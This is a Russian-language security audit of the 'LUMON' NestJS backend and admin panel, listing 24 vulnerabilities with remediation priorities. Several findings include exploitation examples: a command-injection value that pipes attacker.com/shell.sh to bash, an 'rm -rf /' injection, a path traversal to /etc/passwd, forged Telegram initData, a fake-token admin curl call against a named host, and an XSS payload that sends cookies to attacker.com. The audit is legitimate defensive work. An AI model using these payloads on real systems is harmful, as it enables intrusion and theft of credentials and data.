# 🔴 КРИТИЧЕСКИЙ АУДИТ БЕЗОПАСНОСТИ - LUMON

**Дата**: 2025-11-19
**Аудитор**: Senior Security Analyst
**Статус**: 🚨 **24 КРИТИЧЕСКИХ УЯЗВИМОСТИ ОБНАРУЖЕНО**

---

## 📊 SUMMARY

| Критичность | Количество |
|------------|-----------|
| 🔴 CRITICAL | 7 |
| 🟠 HIGH | 8 |
| 🟡 MEDIUM | 7 |
| 🔵 LOW | 2 |
| **TOTAL** | **24** |

---

## 🔴 CRITICAL VULNERABILITIES (Немедленное исправление!)

### 1. **COMMAND INJECTION в функции создания бэкапа**
**Файл**: `back/api/src/modules/admin/admin.service.ts:599`
**Тип**: Command Injection (CWE-78)
**CVSS**: 9.8 (Critical)

```typescript
// УЯЗВИМЫЙ КОД:
const command = `PGPASSWORD="${dbPassword}" pg_dump -h ${dbHost} -p ${dbPort} -U ${dbUser} -d ${dbName} -F p -f "${filePath}"`;
await execAsync(command);
```

**Проблема**: Прямая интерполяция переменных окружения в shell команду. Если `dbPassword`, `dbHost`, `dbUser` или `dbName` содержат специальные символы (например: `"; rm -rf / #`), произойдет выполнение произвольного кода.

**Эксплуатация**:
```bash
DB_PASSWORD='"; curl attacker.com/shell.sh | bash #'
```

---

### 2. **COMMAND INJECTION в функции восстановления бэкапа**
**Файл**: `back/api/src/modules/admin/admin.service.ts:654`
**Тип**: Command Injection (CWE-78)
**CVSS**: 9.8 (Critical)

```typescript
// УЯЗВИМЫЙ КОД:
const command = `PGPASSWORD="${dbPassword}" psql -h ${dbHost} -p ${dbPort} -U ${dbUser} -d ${dbName} -f "${filePath}"`;
await execAsync(command);
```

**Проблема**: Аналогично пункту 1 - та же уязвимость в restore функции.

---

### 3. **PATH TRAVERSAL в backup/restore**
**Файл**: `back/api/src/modules/admin/admin.service.ts:632,202`
**Тип**: Path Traversal (CWE-22)
**CVSS**: 9.1 (Critical)

```typescript
// УЯЗВИМЫЙ КОД:
async restoreBackup(backupId: string, filePath: string) {
  // filePath приходит от пользователя без валидации!
  if (!fs.existsSync(filePath)) {
    throw new NotFoundException('Backup file not found');
  }
  // Чтение произвольного файла системы
  const command = `... -f "${filePath}"`;
}
```

**Эксплуатация**:
```json
{
  "backup_id": "123",
  "file_path": "/etc/passwd"
}
```

Атакующий может прочитать/восстановить любой файл системы!

---

### 4. **ОТСУТСТВИЕ ПРОВЕРКИ TELEGRAM HASH**
**Файл**: `back/api/src/modules/auth/auth.service.ts:174-217`
**Тип**: Authentication Bypass (CWE-287)
**CVSS**: 9.8 (Critical)

```typescript
// УЯЗВИМЫЙ КОД:
private parseTelegramInitData(initData: string) {
  const params: Record<string, string> = {};
  initData.split('&').forEach((pair) => {
    const [key, value] = pair.split('=');
    params[key] = value;
  });
  const userStr = decodeURIComponent(params.user);
  const user = JSON.parse(userStr);
  // НЕТ ПРОВЕРКИ HASH!
  return {
    telegram_id: user.id.toString(),
    // ...
  };
}
```

**Проблема**: Telegram initData должна проверяться через HMAC-SHA256 с использованием `TELEGRAM_BOT_TOKEN`. Сейчас любой может подделать initData и авторизоваться за любого пользователя!

**Эксплуатация**:
```javascript
// Подделка initData без проверки hash
const fakeInitData = `user=${encodeURIComponent(JSON.stringify({
  id: 12345,
  first_name: "Admin",
  username: "admin"
}))}&auth_date=1234567890`;

// Получаем доступ за пользователя с ID 12345
```

---

### 5. **СЛАБАЯ АДМИН АУТЕНТИФИКАЦИЯ**
**Файл**: `back/api/src/modules/admin/admin.controller.ts:14-32`
**Тип**: Broken Authentication (CWE-287)
**CVSS**: 9.1 (Critical)

```typescript
// УЯЗВИМЫЙ КОД:
class AdminGuard {
  async canActivate(context: any): Promise<boolean> {
    const token = authHeader.replace('Bearer ', '').trim();
    if (!token || token.length < 10) {
      throw new UnauthorizedException('Invalid admin token');
    }
    // ПРОСТО ПРОВЕРЯЕТ ДЛИНУ! НЕ ПРОВЕРЯЕТ ВАЛИДНОСТЬ!
    return true;
  }
}
```

**Проблема**: AdminGuard проверяет ТОЛЬКО длину токена. Любая строка длиннее 10 символов даст доступ админа!

**Эксплуатация**:
```bash
curl -H "Authorization: Bearer 1234567890" https://n8n.psayha.ru/webhook/admin/users-list
# ПОЛНЫЙ ДОСТУП К АДМИН ПАНЕЛИ!
```

---

### 6. **СЛАБАЯ ВАЛИДАЦИЯ АДМИН СЕССИИ**
**Файл**: `back/api/src/modules/admin/admin.service.ts:92-103`
**Тип**: Broken Authentication (CWE-287)
**CVSS**: 9.1 (Critical)

```typescript
// УЯЗВИМЫЙ КОД:
async validateAdminSession(token: string) {
  // Просто проверяет длину, НЕ ИСПОЛЬЗУЕТ БД!
  if (!token || token.length < 10) {
    throw new UnauthorizedException('Invalid admin token');
  }
  return {
    success: true,
    data: { role: 'admin' },
  };
}
```

**Проблема**: Функция валидации не проверяет токен в базе данных. Любой токен длиннее 10 символов валиден!

---

### 7. **ХАРДКОЖЕННЫЕ КРЕДЫ АДМИНИСТРАТОРА**
**Файл**: `back/api/src/modules/admin/admin.service.ts:32-34`
**Тип**: Hard-coded Credentials (CWE-798)
**CVSS**: 8.8 (High-Critical)

```typescript
// УЯЗВИМЫЙ КОД:
private readonly ADMIN_USERNAME = process.env.ADMIN_USERNAME || 'admin';
private readonly ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin_password_change_me';
```

**Проблема**: Дефолтные креды `admin:admin_password_change_me` присутствуют в коде. Если переменные окружения не установлены, используются дефолтные креды.

---

## 🟠 HIGH VULNERABILITIES

### 8. **SSL CERTIFICATE VALIDATION DISABLED**
**Файл**: `back/api/src/config/typeorm.config.ts:17`
**Тип**: Insecure SSL/TLS (CWE-295)
**CVSS**: 7.4 (High)

```typescript
ssl: process.env.DB_SSL === 'true' ? { rejectUnauthorized: false } : false,
```

**Проблема**: `rejectUnauthorized: false` отключает проверку SSL сертификатов. Позволяет MITM атаки на соединение с БД.

---

### 9. **CORS LOCALHOST В PRODUCTION**
**Файл**: `back/api/src/main.ts:11-22`
**Тип**: CORS Misconfiguration (CWE-942)
**CVSS**: 7.5 (High)

```typescript
app.enableCors({
  origin: [
    'http://localhost:5173',  // ❌ ОПАСНО В PRODUCTION!
    'http://localhost:3000',  // ❌ ОПАСНО В PRODUCTION!
    'https://lumon.psayha.ru',
    // ...
  ],
  credentials: true,
});
```

**Проблема**: Localhost разрешен в CORS в production сборке. Локальные атакующие приложения могут делать запросы с credentials.

---

### 10. **MASS ASSIGNMENT VULNERABILITY**
**Файл**: `back/api/src/main.ts:28`
**Тип**: Mass Assignment (CWE-915)
**CVSS**: 7.3 (High)

```typescript
new ValidationPipe({
  whitelist: true,
  forbidNonWhitelisted: false,  // ❌ УЯЗВИМОСТЬ!
  transform: true,
})
```

**Проблема**: `forbidNonWhitelisted: false` позволяет передавать дополнительные поля, не описанные в DTO. Возможна перезапись критичных полей.

---

### 11. **ОТСУТСТВИЕ RATE LIMITING**
**Файлы**: Все контроллеры
**Тип**: Missing Rate Limiting (CWE-770)
**CVSS**: 7.5 (High)

**Проблема**: Нет rate limiting на критичных эндпоинтах:
- `/webhook/admin/login` - brute force атаки
- `/webhook/auth-init-v2` - массовая регистрация
- `/webhook/chat-save-message` - DoS атаки

---

### 12. **ОТСУТСТВИЕ CSRF ЗАЩИТЫ**
**Файлы**: Все POST эндпоинты
**Тип**: CSRF (CWE-352)
**CVSS**: 7.1 (High)

**Проблема**: Нет CSRF токенов. Атакующий сайт может выполнять действия от имени жертвы:
- Удаление пользователей
- Создание бэкапов
- Изменение лимитов

---

### 13. **SESSION TOKENS НЕ ХЕШИРУЮТСЯ**
**Файл**: `back/api/src/modules/auth/auth.service.ts:48-59`
**Тип**: Sensitive Data Exposure (CWE-312)
**CVSS**: 7.2 (High)

```typescript
const sessionToken = uuidv4();
await this.sessionRepository.save({
  session_token: sessionToken,  // Хранится в открытом виде!
  // ...
});
```

**Проблема**: Сессионные токены хранятся в БД в открытом виде. При компрометации БД - все сессии скомпрометированы.

---

### 14. **ОТСУТСТВИЕ HELMET.JS**
**Файл**: `back/api/src/main.ts`
**Тип**: Missing Security Headers (CWE-693)
**CVSS**: 6.5 (Medium-High)

**Проблема**: Нет защитных HTTP заголовков:
- X-Frame-Options
- X-Content-Type-Options
- Strict-Transport-Security
- X-XSS-Protection

---

### 15. **ОТСУТСТВИЕ CSP HEADERS**
**Файл**: `back/api/src/main.ts`, `adminpage/`
**Тип**: Missing CSP (CWE-1021)
**CVSS**: 6.5 (Medium-High)

**Проблема**: Нет Content-Security-Policy headers. XSS атаки более эффективны.

---

## 🟡 MEDIUM VULNERABILITIES

### 16. **НЕТ ВАЛИДАЦИИ РАЗМЕРА СООБЩЕНИЙ**
**Файл**: `back/api/src/modules/chat/chat.service.ts:151-156`
**Тип**: Resource Exhaustion (CWE-400)
**CVSS**: 5.3 (Medium)

**Проблема**: Нет ограничения на размер `content` сообщений. DoS атаки через огромные сообщения.

---

### 17. **НЕТ SANITIZATION КОНТЕНТА**
**Файл**: `back/api/src/modules/chat/chat.service.ts:154`
**Тип**: Stored XSS (CWE-79)
**CVSS**: 6.1 (Medium)

```typescript
content: dto.content.trim(),  // Только trim, нет sanitization!
```

**Проблема**: Контент сообщений не санитизируется. Stored XSS возможен при отображении сообщений.

**Эксплуатация**:
```json
{
  "content": "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>"
}
```

---

### 18. **НЕТ ВАЛИДАЦИИ METADATA**
**Файл**: `back/api/src/modules/chat/chat.service.ts:155`
**Тип**: JSON Injection (CWE-74)
**CVSS**: 5.9 (Medium)

```typescript
metadata: dto.metadata || {},  // Нет валидации структуры!
```

**Проблема**: Метаданные могут содержать произвольный JSON. Возможна инъекция вредоносных данных.

---

### 19. **VERBOSE ERROR MESSAGES**
**Файлы**: Все сервисы
**Тип**: Information Disclosure (CWE-209)
**CVSS**: 4.3 (Medium)

```typescript
throw new Error(`Failed to create backup: ${(error as Error).message}`);
```

**Проблема**: Детальные сообщения об ошибках раскрывают внутреннюю структуру системы.

---

### 20. **ЛОГИРОВАНИЕ В CONSOLE**
**Файлы**: Множество файлов
**Тип**: Insufficient Logging (CWE-778)
**CVSS**: 4.0 (Medium)

```typescript
console.error('Failed to log audit event:', err);
```

**Проблема**: Использование console.log/error в production. Нет структурированного логирования.

---

### 21. **ОТСУТСТВИЕ HTTPS ENFORCEMENT**
**Файл**: `back/api/src/main.ts`
**Тип**: Missing HTTPS Enforcement (CWE-319)
**CVSS**: 5.9 (Medium)

**Проблема**: Нет редиректа HTTP → HTTPS. Возможна передача credentials по незащищенному каналу.

---

### 22. **НЕТ INPUT SANITIZATION**
**Файлы**: Все DTO
**Тип**: Improper Input Validation (CWE-20)
**CVSS**: 5.3 (Medium)

**Проблема**: Нет глобальной sanitization входных данных. XSS/Injection риски.

---

## 🔵 LOW VULNERABILITIES

### 23. **НЕТ ПРОВЕРКИ MIME ТИПОВ**
**Файл**: Backup/restore функции
**Тип**: Unrestricted File Upload (CWE-434)
**CVSS**: 4.3 (Low)

**Проблема**: Нет проверки MIME типов загружаемых файлов бэкапов.

---

### 24. **ОТСУТСТВИЕ SECURITY.TXT**
**Файл**: Отсутствует
**Тип**: Missing Security Contact (RFC 9116)
**CVSS**: 3.0 (Low)

**Проблема**: Нет файла `/.well-known/security.txt` для responsible disclosure.

---

## 📋 ПЛАН ИСПРАВЛЕНИЯ

### Приоритет 1 (Немедленно):
1. ✅ Исправить Command Injection (#1, #2)
2. ✅ Исправить Path Traversal (#3)
3. ✅ Добавить проверку Telegram hash (#4)
4. ✅ Исправить админ аутентификацию (#5, #6, #7)

### Приоритет 2 (Срочно):
5. ✅ Исправить SSL конфигурацию (#8)
6. ✅ Настроить CORS правильно (#9)
7. ✅ Добавить rate limiting (#11)
8. ✅ Добавить CSRF защиту (#12)
9. ✅ Хешировать session tokens (#13)

### Приоритет 3 (Важно):
10. ✅ Добавить Helmet.js (#14)
11. ✅ Добавить CSP headers (#15)
12. ✅ Валидация размера данных (#16)
13. ✅ Sanitization контента (#17, #22)

### Приоритет 4 (Желательно):
14. ✅ Улучшить обработку ошибок (#19)
15. ✅ Настроить структурированное логирование (#20)
16. ✅ HTTPS enforcement (#21)
17. ✅ Валидация файлов (#23)
18. ✅ Создать security.txt (#24)

---

## 🎯 РЕКОМЕНДАЦИИ

### Немедленные действия:
1. **ОТКЛЮЧИТЬ PRODUCTION** до исправления критических уязвимостей
2. Проверить логи на признаки эксплуатации
3. Сменить все пароли и токены
4. Уведомить пользователей о возможной компрометации

### Долгосрочные улучшения:
1. Внедрить регулярные security audits
2. Настроить CI/CD с security сканерами (Snyk, SonarQube)
3. Добавить WAF (Web Application Firewall)
4. Внедрить bug bounty программу
5. Обучение команды безопасной разработке

---

**Отчет составлен**: 2025-11-19
**Следующий аудит**: После исправления всех уязвимостей
